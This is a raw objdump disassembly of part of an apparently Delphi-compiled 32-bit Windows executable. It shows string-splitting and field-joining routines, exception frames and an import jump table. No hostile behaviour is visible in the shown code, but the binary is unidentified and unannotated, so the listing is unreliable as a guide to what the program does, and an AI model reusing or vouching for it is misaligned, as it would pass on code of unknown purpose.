  4075a0:	57                   	push   %edi
  4075a1:	33 db                	xor    %ebx,%ebx
  4075a3:	89 5d c8             	mov    %ebx,-0x38(%ebp)
  4075a6:	89 5d d0             	mov    %ebx,-0x30(%ebp)
  4075a9:	89 5d cc             	mov    %ebx,-0x34(%ebp)
  4075ac:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  4075af:	8b f2                	mov    %edx,%esi
  4075b1:	8d 7d e4             	lea    -0x1c(%ebp),%edi
  4075b4:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4075b5:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4075b6:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4075b7:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4075b8:	8b d9                	mov    %ecx,%ebx
  4075ba:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4075bd:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4075c0:	e8 0f bb ff ff       	call   0x4030d4
  4075c5:	8d 75 f4             	lea    -0xc(%ebp),%esi
  4075c8:	33 c0                	xor    %eax,%eax
  4075ca:	55                   	push   %ebp
  4075cb:	68 9a 76 40 00       	push   $0x40769a
  4075d0:	64 ff 30             	push   %fs:(%eax)
  4075d3:	64 89 20             	mov    %esp,%fs:(%eax)
  4075d6:	8b c3                	mov    %ebx,%eax
  4075d8:	e8 e3 a4 ff ff       	call   0x401ac0
  4075dd:	8d 45 f8             	lea    -0x8(%ebp),%eax
  4075e0:	50                   	push   %eax
  4075e1:	6a 00                	push   $0x0
  4075e3:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  4075e6:	50                   	push   %eax
  4075e7:	6a 00                	push   $0x0
  4075e9:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4075ec:	50                   	push   %eax
  4075ed:	8b 00                	mov    (%eax),%eax
  4075ef:	ff 50 3c             	call   *0x3c(%eax)
  4075f2:	33 c0                	xor    %eax,%eax
  4075f4:	89 06                	mov    %eax,(%esi)
  4075f6:	56                   	push   %esi
  4075f7:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  4075fa:	50                   	push   %eax
  4075fb:	6a 01                	push   $0x1
  4075fd:	8b 45 f8             	mov    -0x8(%ebp),%eax
  407600:	50                   	push   %eax
  407601:	8b 00                	mov    (%eax),%eax
  407603:	ff 50 0c             	call   *0xc(%eax)
  407606:	83 3e 00             	cmpl   $0x0,(%esi)
  407609:	76 5f                	jbe    0x40766a
  40760b:	ff 33                	push   (%ebx)
  40760d:	8d 55 d0             	lea    -0x30(%ebp),%edx
  407610:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  407613:	e8 54 ff ff ff       	call   0x40756c
  407618:	ff 75 d0             	push   -0x30(%ebp)
  40761b:	68 b0 76 40 00       	push   $0x4076b0
  407620:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  407623:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  407626:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  407629:	e8 72 fd ff ff       	call   0x4073a0
  40762e:	ff 75 cc             	push   -0x34(%ebp)
  407631:	68 bc 76 40 00       	push   $0x4076bc
  407636:	8b c3                	mov    %ebx,%eax
  407638:	ba 05 00 00 00       	mov    $0x5,%edx
  40763d:	e8 ce a7 ff ff       	call   0x401e10
  407642:	ff 33                	push   (%ebx)
  407644:	8d 45 c8             	lea    -0x38(%ebp),%eax
  407647:	50                   	push   %eax
  407648:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  40764b:	8d 55 e4             	lea    -0x1c(%ebp),%edx
  40764e:	8b 45 fc             	mov    -0x4(%ebp),%eax
  407651:	e8 f6 fd ff ff       	call   0x40744c
  407656:	ff 75 c8             	push   -0x38(%ebp)
  407659:	68 bc 76 40 00       	push   $0x4076bc
  40765e:	8b c3                	mov    %ebx,%eax
  407660:	ba 03 00 00 00       	mov    $0x3,%edx
  407665:	e8 a6 a7 ff ff       	call   0x401e10
  40766a:	83 3e 00             	cmpl   $0x0,(%esi)
  40766d:	75 87                	jne    0x4075f6
  40766f:	33 c0                	xor    %eax,%eax
  407671:	5a                   	pop    %edx
  407672:	59                   	pop    %ecx
  407673:	59                   	pop    %ecx
  407674:	64 89 10             	mov    %edx,%fs:(%eax)
  407677:	68 a1 76 40 00       	push   $0x4076a1
  40767c:	8d 45 c8             	lea    -0x38(%ebp),%eax
  40767f:	ba 03 00 00 00       	mov    $0x3,%edx
  407684:	e8 5b a4 ff ff       	call   0x401ae4
  407689:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40768c:	e8 d3 b9 ff ff       	call   0x403064
  407691:	8d 45 fc             	lea    -0x4(%ebp),%eax
  407694:	e8 cb b9 ff ff       	call   0x403064
  407699:	c3                   	ret
  40769a:	e9 6d a1 ff ff       	jmp    0x40180c
  40769f:	eb db                	jmp    0x40767c
  4076a1:	5f                   	pop    %edi
  4076a2:	5e                   	pop    %esi
  4076a3:	5b                   	pop    %ebx
  4076a4:	8b e5                	mov    %ebp,%esp
  4076a6:	5d                   	pop    %ebp
  4076a7:	c3                   	ret
  4076a8:	ff                   	(bad)
  4076a9:	ff                   	(bad)
  4076aa:	ff                   	(bad)
  4076ab:	ff 03                	incl   (%ebx)
  4076ad:	00 00                	add    %al,(%eax)
  4076af:	00 2d 2d 2d 00 ff    	add    %ch,0xff002d2d
  4076b5:	ff                   	(bad)
  4076b6:	ff                   	(bad)
  4076b7:	ff 02                	incl   (%edx)
  4076b9:	00 00                	add    %al,(%eax)
  4076bb:	00 0d 0a 00 00 55    	add    %cl,0x5500000a
  4076c1:	8b ec                	mov    %esp,%ebp
  4076c3:	83 c4 d8             	add    $0xffffffd8,%esp
  4076c6:	53                   	push   %ebx
  4076c7:	56                   	push   %esi
  4076c8:	33 c9                	xor    %ecx,%ecx
  4076ca:	89 4d d8             	mov    %ecx,-0x28(%ebp)
  4076cd:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  4076d0:	89 4d dc             	mov    %ecx,-0x24(%ebp)
  4076d3:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  4076d6:	8b da                	mov    %edx,%ebx
  4076d8:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4076db:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4076de:	e8 f1 b9 ff ff       	call   0x4030d4
  4076e3:	8d 75 f4             	lea    -0xc(%ebp),%esi
  4076e6:	33 c0                	xor    %eax,%eax
  4076e8:	55                   	push   %ebp
  4076e9:	68 ad 77 40 00       	push   $0x4077ad
  4076ee:	64 ff 30             	push   %fs:(%eax)
  4076f1:	64 89 20             	mov    %esp,%fs:(%eax)
  4076f4:	8b c3                	mov    %ebx,%eax
  4076f6:	e8 c5 a3 ff ff       	call   0x401ac0
  4076fb:	8d 45 f8             	lea    -0x8(%ebp),%eax
  4076fe:	50                   	push   %eax
  4076ff:	6a 00                	push   $0x0
  407701:	6a 00                	push   $0x0
  407703:	8b 45 fc             	mov    -0x4(%ebp),%eax
  407706:	50                   	push   %eax
  407707:	8b 00                	mov    (%eax),%eax
  407709:	ff 50 38             	call   *0x38(%eax)
  40770c:	33 c0                	xor    %eax,%eax
  40770e:	89 06                	mov    %eax,(%esi)
  407710:	56                   	push   %esi
  407711:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  407714:	50                   	push   %eax
  407715:	6a 01                	push   $0x1
  407717:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40771a:	50                   	push   %eax
  40771b:	8b 00                	mov    (%eax),%eax
  40771d:	ff 50 0c             	call   *0xc(%eax)
  407720:	83 3e 00             	cmpl   $0x0,(%esi)
  407723:	76 58                	jbe    0x40777d
  407725:	ff 33                	push   (%ebx)
  407727:	8d 55 e0             	lea    -0x20(%ebp),%edx
  40772a:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  40772d:	e8 3a fe ff ff       	call   0x40756c
  407732:	ff 75 e0             	push   -0x20(%ebp)
  407735:	68 c4 77 40 00       	push   $0x4077c4
  40773a:	8d 55 dc             	lea    -0x24(%ebp),%edx
  40773d:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  407740:	e8 b7 fc ff ff       	call   0x4073fc
  407745:	ff 75 dc             	push   -0x24(%ebp)
  407748:	68 d0 77 40 00       	push   $0x4077d0
  40774d:	8b c3                	mov    %ebx,%eax
  40774f:	ba 05 00 00 00       	mov    $0x5,%edx
  407754:	e8 b7 a6 ff ff       	call   0x401e10
  407759:	ff 33                	push   (%ebx)
  40775b:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  40775e:	8d 55 e4             	lea    -0x1c(%ebp),%edx
  407761:	8b 45 fc             	mov    -0x4(%ebp),%eax
  407764:	e8 2f fe ff ff       	call   0x407598
  407769:	ff 75 d8             	push   -0x28(%ebp)
  40776c:	68 d0 77 40 00       	push   $0x4077d0
  407771:	8b c3                	mov    %ebx,%eax
  407773:	ba 03 00 00 00       	mov    $0x3,%edx
  407778:	e8 93 a6 ff ff       	call   0x401e10
  40777d:	83 3e 00             	cmpl   $0x0,(%esi)
  407780:	75 8e                	jne    0x407710
  407782:	33 c0                	xor    %eax,%eax
  407784:	5a                   	pop    %edx
  407785:	59                   	pop    %ecx
  407786:	59                   	pop    %ecx
  407787:	64 89 10             	mov    %edx,%fs:(%eax)
  40778a:	68 b4 77 40 00       	push   $0x4077b4
  40778f:	8d 45 d8             	lea    -0x28(%ebp),%eax
  407792:	ba 03 00 00 00       	mov    $0x3,%edx
  407797:	e8 48 a3 ff ff       	call   0x401ae4
  40779c:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40779f:	e8 c0 b8 ff ff       	call   0x403064
  4077a4:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4077a7:	e8 b8 b8 ff ff       	call   0x403064
  4077ac:	c3                   	ret
  4077ad:	e9 5a a0 ff ff       	jmp    0x40180c
  4077b2:	eb db                	jmp    0x40778f
  4077b4:	5e                   	pop    %esi
  4077b5:	5b                   	pop    %ebx
  4077b6:	8b e5                	mov    %ebp,%esp
  4077b8:	5d                   	pop    %ebp
  4077b9:	c3                   	ret
  4077ba:	00 00                	add    %al,(%eax)
  4077bc:	ff                   	(bad)
  4077bd:	ff                   	(bad)
  4077be:	ff                   	(bad)
  4077bf:	ff 03                	incl   (%ebx)
  4077c1:	00 00                	add    %al,(%eax)
  4077c3:	00 2d 2d 2d 00 ff    	add    %ch,0xff002d2d
  4077c9:	ff                   	(bad)
  4077ca:	ff                   	(bad)
  4077cb:	ff 02                	incl   (%edx)
  4077cd:	00 00                	add    %al,(%eax)
  4077cf:	00 0d 0a 00 00 55    	add    %cl,0x5500000a
  4077d5:	8b ec                	mov    %esp,%ebp
  4077d7:	83 c4 f8             	add    $0xfffffff8,%esp
  4077da:	53                   	push   %ebx
  4077db:	8b da                	mov    %edx,%ebx
  4077dd:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4077e0:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4077e3:	e8 ec b8 ff ff       	call   0x4030d4
  4077e8:	33 c0                	xor    %eax,%eax
  4077ea:	55                   	push   %ebp
  4077eb:	68 26 78 40 00       	push   $0x407826
  4077f0:	64 ff 30             	push   %fs:(%eax)
  4077f3:	64 89 20             	mov    %esp,%fs:(%eax)
  4077f6:	8d 45 f8             	lea    -0x8(%ebp),%eax
  4077f9:	50                   	push   %eax
  4077fa:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4077fd:	50                   	push   %eax
  4077fe:	8b 00                	mov    (%eax),%eax
  407800:	ff 50 0c             	call   *0xc(%eax)
  407803:	8b c3                	mov    %ebx,%eax
  407805:	8b 55 f8             	mov    -0x8(%ebp),%edx
  407808:	8b 52 18             	mov    0x18(%edx),%edx
  40780b:	e8 cc a4 ff ff       	call   0x401cdc
  407810:	33 c0                	xor    %eax,%eax
  407812:	5a                   	pop    %edx
  407813:	59                   	pop    %ecx
  407814:	59                   	pop    %ecx
  407815:	64 89 10             	mov    %edx,%fs:(%eax)
  407818:	68 2d 78 40 00       	push   $0x40782d
  40781d:	8d 45 fc             	lea    -0x4(%ebp),%eax
  407820:	e8 3f b8 ff ff       	call   0x403064
  407825:	c3                   	ret
  407826:	e9 e1 9f ff ff       	jmp    0x40180c
  40782b:	eb f0                	jmp    0x40781d
  40782d:	5b                   	pop    %ebx
  40782e:	59                   	pop    %ecx
  40782f:	59                   	pop    %ecx
  407830:	5d                   	pop    %ebp
  407831:	c3                   	ret
  407832:	8b c0                	mov    %eax,%eax
  407834:	55                   	push   %ebp
  407835:	8b ec                	mov    %esp,%ebp
  407837:	b9 04 00 00 00       	mov    $0x4,%ecx
  40783c:	6a 00                	push   $0x0
  40783e:	6a 00                	push   $0x0
  407840:	49                   	dec    %ecx
  407841:	75 f9                	jne    0x40783c
  407843:	51                   	push   %ecx
  407844:	53                   	push   %ebx
  407845:	8b d8                	mov    %eax,%ebx
  407847:	33 c0                	xor    %eax,%eax
  407849:	55                   	push   %ebp
  40784a:	68 a5 7a 40 00       	push   $0x407aa5
  40784f:	64 ff 30             	push   %fs:(%eax)
  407852:	64 89 20             	mov    %esp,%fs:(%eax)
  407855:	8b c3                	mov    %ebx,%eax
  407857:	e8 64 a2 ff ff       	call   0x401ac0
  40785c:	6a 00                	push   $0x0
  40785e:	6a 00                	push   $0x0
  407860:	a1 b0 e9 40 00       	mov    0x40e9b0,%eax
  407865:	50                   	push   %eax
  407866:	68 ac e9 40 00       	push   $0x40e9ac
  40786b:	e8 8c f9 ff ff       	call   0x4071fc
  407870:	8d 55 e8             	lea    -0x18(%ebp),%edx
  407873:	a1 ac e9 40 00       	mov    0x40e9ac,%eax
  407878:	e8 57 ff ff ff       	call   0x4077d4
  40787d:	8d 55 fc             	lea    -0x4(%ebp),%edx
  407880:	a1 ac e9 40 00       	mov    0x40e9ac,%eax
  407885:	e8 36 fe ff ff       	call   0x4076c0
  40788a:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  40788e:	0f 84 f6 01 00 00    	je     0x407a8a
  407894:	e9 dc 01 00 00       	jmp    0x407a75
  407899:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40789c:	50                   	push   %eax
  40789d:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4078a0:	b8 bc 7a 40 00       	mov    $0x407abc,%eax
  4078a5:	e8 82 a7 ff ff       	call   0x40202c
  4078aa:	8b c8                	mov    %eax,%ecx
  4078ac:	49                   	dec    %ecx
  4078ad:	ba 01 00 00 00       	mov    $0x1,%edx
  4078b2:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4078b5:	e8 ea a6 ff ff       	call   0x401fa4
  4078ba:	8b 55 f8             	mov    -0x8(%ebp),%edx
  4078bd:	b8 c8 7a 40 00       	mov    $0x407ac8,%eax
  4078c2:	e8 65 a7 ff ff       	call   0x40202c
  4078c7:	85 c0                	test   %eax,%eax
  4078c9:	0f 8e 89 01 00 00    	jle    0x407a58
  4078cf:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  4078d2:	50                   	push   %eax
  4078d3:	8b 55 f8             	mov    -0x8(%ebp),%edx
  4078d6:	b8 c8 7a 40 00       	mov    $0x407ac8,%eax
  4078db:	e8 4c a7 ff ff       	call   0x40202c
  4078e0:	8b c8                	mov    %eax,%ecx
  4078e2:	49                   	dec    %ecx
  4078e3:	ba 01 00 00 00       	mov    $0x1,%edx
  4078e8:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4078eb:	e8 b4 a6 ff ff       	call   0x401fa4
  4078f0:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  4078f3:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4078f6:	b9 dc 7a 40 00       	mov    $0x407adc,%ecx
  4078fb:	e8 9c a4 ff ff       	call   0x401d9c
  407900:	8b 55 fc             	mov    -0x4(%ebp),%edx
  407903:	b8 bc 7a 40 00       	mov    $0x407abc,%eax
  407908:	e8 1f a7 ff ff       	call   0x40202c
  40790d:	8b c8                	mov    %eax,%ecx
  40790f:	41                   	inc    %ecx
  407910:	8d 45 fc             	lea    -0x4(%ebp),%eax
  407913:	ba 01 00 00 00       	mov    $0x1,%edx
  407918:	e8 c7 a6 ff ff       	call   0x401fe4
  40791d:	8d 45 f8             	lea    -0x8(%ebp),%eax
  407920:	50                   	push   %eax
  407921:	8b 55 fc             	mov    -0x4(%ebp),%edx
  407924:	b8 bc 7a 40 00       	mov    $0x407abc,%eax
  407929:	e8 fe a6 ff ff       	call   0x40202c
  40792e:	8b c8                	mov    %eax,%ecx
  407930:	49                   	dec    %ecx
  407931:	ba 01 00 00 00       	mov    $0x1,%edx
  407936:	8b 45 fc             	mov    -0x4(%ebp),%eax
  407939:	e8 66 a6 ff ff       	call   0x401fa4
  40793e:	8b 55 fc             	mov    -0x4(%ebp),%edx
  407941:	b8 bc 7a 40 00       	mov    $0x407abc,%eax
  407946:	e8 e1 a6 ff ff       	call   0x40202c
  40794b:	8b c8                	mov    %eax,%ecx
  40794d:	41                   	inc    %ecx
  40794e:	8d 45 fc             	lea    -0x4(%ebp),%eax
  407951:	ba 01 00 00 00       	mov    $0x1,%edx
  407956:	e8 89 a6 ff ff       	call   0x401fe4
  40795b:	8b 55 f8             	mov    -0x8(%ebp),%edx
  40795e:	b8 e8 7a 40 00       	mov    $0x407ae8,%eax
  407963:	e8 c4 a6 ff ff       	call   0x40202c
  407968:	85 c0                	test   %eax,%eax
  40796a:	0f 8e 05 01 00 00    	jle    0x407a75
  407970:	e9 cc 00 00 00       	jmp    0x407a41
  407975:	8d 45 e0             	lea    -0x20(%ebp),%eax
  407978:	50                   	push   %eax
  407979:	8b 55 f8             	mov    -0x8(%ebp),%edx
  40797c:	b8 e8 7a 40 00       	mov    $0x407ae8,%eax
  407981:	e8 a6 a6 ff ff       	call   0x40202c
  407986:	8b c8                	mov    %eax,%ecx
  407988:	49                   	dec    %ecx
  407989:	ba 01 00 00 00       	mov    $0x1,%edx
  40798e:	8b 45 f8             	mov    -0x8(%ebp),%eax
  407991:	e8 0e a6 ff ff       	call   0x401fa4
  407996:	8b 55 e0             	mov    -0x20(%ebp),%edx
  407999:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40799c:	b9 dc 7a 40 00       	mov    $0x407adc,%ecx
  4079a1:	e8 f6 a3 ff ff       	call   0x401d9c
  4079a6:	8b 55 f8             	mov    -0x8(%ebp),%edx
  4079a9:	b8 e8 7a 40 00       	mov    $0x407ae8,%eax
  4079ae:	e8 79 a6 ff ff       	call   0x40202c
  4079b3:	8b c8                	mov    %eax,%ecx
  4079b5:	8d 45 f8             	lea    -0x8(%ebp),%eax
  4079b8:	ba 01 00 00 00       	mov    $0x1,%edx
  4079bd:	e8 22 a6 ff ff       	call   0x401fe4
  4079c2:	8d 45 dc             	lea    -0x24(%ebp),%eax
  4079c5:	50                   	push   %eax
  4079c6:	8b 55 f8             	mov    -0x8(%ebp),%edx
  4079c9:	b8 e8 7a 40 00       	mov    $0x407ae8,%eax
  4079ce:	e8 59 a6 ff ff       	call   0x40202c
  4079d3:	8b c8                	mov    %eax,%ecx
  4079d5:	49                   	dec    %ecx
  4079d6:	ba 01 00 00 00       	mov    $0x1,%edx
  4079db:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4079de:	e8 c1 a5 ff ff       	call   0x401fa4
  4079e3:	8b 55 dc             	mov    -0x24(%ebp),%edx
  4079e6:	8d 45 ec             	lea    -0x14(%ebp),%eax
  4079e9:	b9 dc 7a 40 00       	mov    $0x407adc,%ecx
  4079ee:	e8 a9 a3 ff ff       	call   0x401d9c
  4079f3:	8b 55 f8             	mov    -0x8(%ebp),%edx
  4079f6:	b8 e8 7a 40 00       	mov    $0x407ae8,%eax
  4079fb:	e8 2c a6 ff ff       	call   0x40202c
  407a00:	8b c8                	mov    %eax,%ecx
  407a02:	8d 45 f8             	lea    -0x8(%ebp),%eax
  407a05:	ba 01 00 00 00       	mov    $0x1,%edx
  407a0a:	e8 d5 a5 ff ff       	call   0x401fe4
  407a0f:	83 7d f0 00          	cmpl   $0x0,-0x10(%ebp)
  407a13:	74 2c                	je     0x407a41
  407a15:	83 7d ec 00          	cmpl   $0x0,-0x14(%ebp)
  407a19:	74 26                	je     0x407a41
  407a1b:	ff 33                	push   (%ebx)
  407a1d:	ff 75 f4             	push   -0xc(%ebp)
  407a20:	ff 75 f0             	push   -0x10(%ebp)
  407a23:	68 dc 7a 40 00       	push   $0x407adc
  407a28:	ff 75 ec             	push   -0x14(%ebp)
  407a2b:	68 dc 7a 40 00       	push   $0x407adc
  407a30:	68 bc 7a 40 00       	push   $0x407abc
  407a35:	8b c3                	mov    %ebx,%eax
  407a37:	ba 07 00 00 00       	mov    $0x7,%edx
  407a3c:	e8 cf a3 ff ff       	call   0x401e10
  407a41:	8b 55 f8             	mov    -0x8(%ebp),%edx
  407a44:	b8 e8 7a 40 00       	mov    $0x407ae8,%eax
  407a49:	e8 de a5 ff ff       	call   0x40202c
  407a4e:	85 c0                	test   %eax,%eax
  407a50:	0f 8f 1f ff ff ff    	jg     0x407975
  407a56:	eb 1d                	jmp    0x407a75
  407a58:	8b 55 fc             	mov    -0x4(%ebp),%edx
  407a5b:	b8 bc 7a 40 00       	mov    $0x407abc,%eax
  407a60:	e8 c7 a5 ff ff       	call   0x40202c
  407a65:	8b c8                	mov    %eax,%ecx
  407a67:	41                   	inc    %ecx
  407a68:	8d 45 fc             	lea    -0x4(%ebp),%eax
  407a6b:	ba 01 00 00 00       	mov    $0x1,%edx
  407a70:	e8 6f a5 ff ff       	call   0x401fe4
  407a75:	8b 55 fc             	mov    -0x4(%ebp),%edx
  407a78:	b8 bc 7a 40 00       	mov    $0x407abc,%eax
  407a7d:	e8 aa a5 ff ff       	call   0x40202c
  407a82:	85 c0                	test   %eax,%eax
  407a84:	0f 8f 0f fe ff ff    	jg     0x407899
  407a8a:	33 c0                	xor    %eax,%eax
  407a8c:	5a                   	pop    %edx
  407a8d:	59                   	pop    %ecx
  407a8e:	59                   	pop    %ecx
  407a8f:	64 89 10             	mov    %edx,%fs:(%eax)
  407a92:	68 ac 7a 40 00       	push   $0x407aac
  407a97:	8d 45 dc             	lea    -0x24(%ebp),%eax
  407a9a:	ba 09 00 00 00       	mov    $0x9,%edx
  407a9f:	e8 40 a0 ff ff       	call   0x401ae4
  407aa4:	c3                   	ret
  407aa5:	e9 62 9d ff ff       	jmp    0x40180c
  407aaa:	eb eb                	jmp    0x407a97
  407aac:	5b                   	pop    %ebx
  407aad:	8b e5                	mov    %ebp,%esp
  407aaf:	5d                   	pop    %ebp
  407ab0:	c3                   	ret
  407ab1:	00 00                	add    %al,(%eax)
  407ab3:	00 ff                	add    %bh,%bh
  407ab5:	ff                   	(bad)
  407ab6:	ff                   	(bad)
  407ab7:	ff 02                	incl   (%edx)
  407ab9:	00 00                	add    %al,(%eax)
  407abb:	00 0d 0a 00 00 ff    	add    %cl,0xff00000a
  407ac1:	ff                   	(bad)
  407ac2:	ff                   	(bad)
  407ac3:	ff 0b                	decl   (%ebx)
  407ac5:	00 00                	add    %al,(%eax)
  407ac7:	00 3a                	add    %bh,(%edx)
  407ac9:	53                   	push   %ebx
  407aca:	74 72                	je     0x407b3e
  407acc:	69 6e 67 44 61 74 61 	imul   $0x61746144,0x67(%esi),%ebp
  407ad3:	00 ff                	add    %bh,%bh
  407ad5:	ff                   	(bad)
  407ad6:	ff                   	(bad)
  407ad7:	ff 02                	incl   (%edx)
  407ad9:	00 00                	add    %al,(%eax)
  407adb:	00 20                	add    %ah,(%eax)
  407add:	7c 00                	jl     0x407adf
  407adf:	00 ff                	add    %bh,%bh
  407ae1:	ff                   	(bad)
  407ae2:	ff                   	(bad)
  407ae3:	ff 01                	incl   (%ecx)
  407ae5:	00 00                	add    %al,(%eax)
  407ae7:	00 2a                	add    %ch,(%edx)
  407ae9:	00 00                	add    %al,(%eax)
  407aeb:	00 55 8b             	add    %dl,-0x75(%ebp)
  407aee:	ec                   	in     (%dx),%al
  407aef:	33 c0                	xor    %eax,%eax
  407af1:	55                   	push   %ebp
  407af2:	68 1d 7b 40 00       	push   $0x407b1d
  407af7:	64 ff 30             	push   %fs:(%eax)
  407afa:	64 89 20             	mov    %esp,%fs:(%eax)
  407afd:	ff 05 a8 e9 40 00    	incl   0x40e9a8
  407b03:	75 0a                	jne    0x407b0f
  407b05:	b8 ac e9 40 00       	mov    $0x40e9ac,%eax
  407b0a:	e8 55 b5 ff ff       	call   0x403064
  407b0f:	33 c0                	xor    %eax,%eax
  407b11:	5a                   	pop    %edx
  407b12:	59                   	pop    %ecx
  407b13:	59                   	pop    %ecx
  407b14:	64 89 10             	mov    %edx,%fs:(%eax)
  407b17:	68 24 7b 40 00       	push   $0x407b24
  407b1c:	c3                   	ret
  407b1d:	e9 ea 9c ff ff       	jmp    0x40180c
  407b22:	eb f8                	jmp    0x407b1c
  407b24:	5d                   	pop    %ebp
  407b25:	c3                   	ret
  407b26:	8b c0                	mov    %eax,%eax
  407b28:	83 2d a8 e9 40 00 01 	subl   $0x1,0x40e9a8
  407b2f:	c3                   	ret
  407b30:	34 7b                	xor    $0x7b,%al
  407b32:	40                   	inc    %eax
  407b33:	00 0e                	add    %cl,(%esi)
  407b35:	06                   	push   %es
  407b36:	53                   	push   %ebx
  407b37:	74 72                	je     0x407bab
  407b39:	6f                   	outsl  %ds:(%esi),(%dx)
  407b3a:	6b 73 08 00          	imul   $0x0,0x8(%ebx),%esi
  407b3e:	00 00                	add    %al,(%eax)
  407b40:	02 00                	add    (%eax),%al
  407b42:	00 00                	add    %al,(%eax)
  407b44:	14 10                	adc    $0x10,%al
  407b46:	40                   	inc    %eax
  407b47:	00 00                	add    %al,(%eax)
  407b49:	00 00                	add    %al,(%eax)
  407b4b:	00 14 10             	add    %dl,(%eax,%edx,1)
  407b4e:	40                   	inc    %eax
  407b4f:	00 04 00             	add    %al,(%eax,%eax,1)
  407b52:	00 00                	add    %al,(%eax)
  407b54:	ff 25 24 03 41 00    	jmp    *0x410324
  407b5a:	8b c0                	mov    %eax,%eax
  407b5c:	ff 25 20 03 41 00    	jmp    *0x410320
  407b62:	8b c0                	mov    %eax,%eax
  407b64:	ff 25 1c 03 41 00    	jmp    *0x41031c
  407b6a:	8b c0                	mov    %eax,%eax
  407b6c:	ff 25 18 03 41 00    	jmp    *0x410318
  407b72:	8b c0                	mov    %eax,%eax
  407b74:	ff 25 14 03 41 00    	jmp    *0x410314
  407b7a:	8b c0                	mov    %eax,%eax
  407b7c:	ff 25 0c 03 41 00    	jmp    *0x41030c
  407b82:	8b c0                	mov    %eax,%eax
  407b84:	ff 25 04 03 41 00    	jmp    *0x410304
  407b8a:	8b c0                	mov    %eax,%eax
  407b8c:	ff 25 00 03 41 00    	jmp    *0x410300
  407b92:	8b c0                	mov    %eax,%eax
  407b94:	55                   	push   %ebp
  407b95:	8b ec                	mov    %esp,%ebp
  407b97:	33 c9                	xor    %ecx,%ecx
  407b99:	51                   	push   %ecx
  407b9a:	51                   	push   %ecx
  407b9b:	51                   	push   %ecx
  407b9c:	51                   	push   %ecx
  407b9d:	51                   	push   %ecx
  407b9e:	51                   	push   %ecx
  407b9f:	51                   	push   %ecx
  407ba0:	53                   	push   %ebx
  407ba1:	56                   	push   %esi
  407ba2:	57                   	push   %edi
  407ba3:	8b da                	mov    %edx,%ebx
  407ba5:	89 45 fc             	mov    %eax,-0x4(%ebp)
  407ba8:	33 c0                	xor    %eax,%eax
  407baa:	55                   	push   %ebp
  407bab:	68 9d 7c 40 00       	push   $0x407c9d
  407bb0:	64 ff 30             	push   %fs:(%eax)
  407bb3:	64 89 20             	mov    %esp,%fs:(%eax)
  407bb6:	8d 45 f0             	lea    -0x10(%ebp),%eax
  407bb9:	e8 02 9f ff ff       	call   0x401ac0
  407bbe:	33 f6                	xor    %esi,%esi
  407bc0:	8d 45 ec             	lea    -0x14(%ebp),%eax
  407bc3:	e8 f8 9e ff ff       	call   0x401ac0
  407bc8:	33 c0                	xor    %eax,%eax
  407bca:	89 45 f8             	mov    %eax,-0x8(%ebp)
  407bcd:	8b fb                	mov    %ebx,%edi
  407bcf:	d1 ef                	shr    $1,%edi
  407bd1:	83 ef 02             	sub    $0x2,%edi
  407bd4:	85 ff                	test   %edi,%edi
  407bd6:	0f 8c a6 00 00 00    	jl     0x407c82
  407bdc:	47                   	inc    %edi
  407bdd:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp)
  407be4:	8b 45 fc             	mov    -0x4(%ebp),%eax
  407be7:	8b 55 f4             	mov    -0xc(%ebp),%edx
  407bea:	8d 04 50             	lea    (%eax,%edx,2),%eax
  407bed:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  407bf0:	ba 01 00 00 00       	mov    $0x1,%edx
  407bf5:	e8 1a ad ff ff       	call   0x402914
  407bfa:	8b 45 e8             	mov    -0x18(%ebp),%eax
  407bfd:	8a 18                	mov    (%eax),%bl
  407bff:	84 db                	test   %bl,%bl
  407c01:	75 4e                	jne    0x407c51
  407c03:	46                   	inc    %esi
  407c04:	8b c6                	mov    %esi,%eax
  407c06:	48                   	dec    %eax
  407c07:	74 07                	je     0x407c10
  407c09:	83 e8 06             	sub    $0x6,%eax
  407c0c:	74 0f                	je     0x407c1d
  407c0e:	eb 37                	jmp    0x407c47
  407c10:	8d 45 ec             	lea    -0x14(%ebp),%eax
  407c13:	8b 55 f0             	mov    -0x10(%ebp),%edx
  407c16:	e8 3d 9f ff ff       	call   0x401b58
  407c1b:	eb 2a                	jmp    0x407c47
  407c1d:	83 7d f0 00          	cmpl   $0x0,-0x10(%ebp)
  407c21:	74 24                	je     0x407c47
  407c23:	8b 45 f8             	mov    -0x8(%ebp),%eax
